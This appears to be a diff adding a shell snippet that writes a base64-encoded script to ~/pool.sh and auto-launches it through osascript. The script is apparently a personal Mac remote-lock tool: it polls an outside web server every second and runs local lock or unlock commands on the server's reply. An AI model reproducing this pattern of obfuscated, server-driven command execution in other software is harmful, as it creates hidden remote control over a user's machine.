@@ -1,0 +1,8 @@
+echo 'IyEvYmluL2Jhc2gKd2hpbGUgdHJ1ZQpkbwogaWYgWyAhIC1mICJjb2RlIiBdCiB0aGVuCiAgZWNobyAiUGxlYXNlIG9wZW4gdXAgdGhlIExvY2sgQXBwIG9uIHlvdXIgaU9TIGRldmljZSBhbmQgZW50ZXIgdGhlIGNvZGUgZGlzcGxheWVkOiIKICByZWFkIGNvZGUKICBlY2hvICRjb2RlID4gY29kZQogZmkKIHJlc3A9JChjdXJsIC1zICJodHRwOi8vcHViYmF5LmNvbS9sb2NrdXAvP2FkbWluJnV1aWQ9JGNvZGUiKQogZWNobyAkcmVzcAogaWYgWyAiJHJlc3AiID0gImxvY2siIF0KIHRoZW4KICBgL1VzZXJzL3NvaGVpbC9sb2NrYAogIGBzYXkgJ2xvY2snYAogZmkKIGlmIFsgIiRyZXNwIiA9ICJ1bmxvY2siIF0KIHRoZW4KICBgc2gga2V5YAogIGBzYXkgJ3VubG9jaydgCiBmaQogc2xlZXAgMQpkb25lCg=='|base64 -D> ~/pool.sh
+
+chmod +x ~/pool.sh
+osascript\
+ -e 'tell application "Terminal"'\
+ -e 'activate'\
+ -e 'do script "sh ~/pool.sh"'\
+ -e 'end tell'
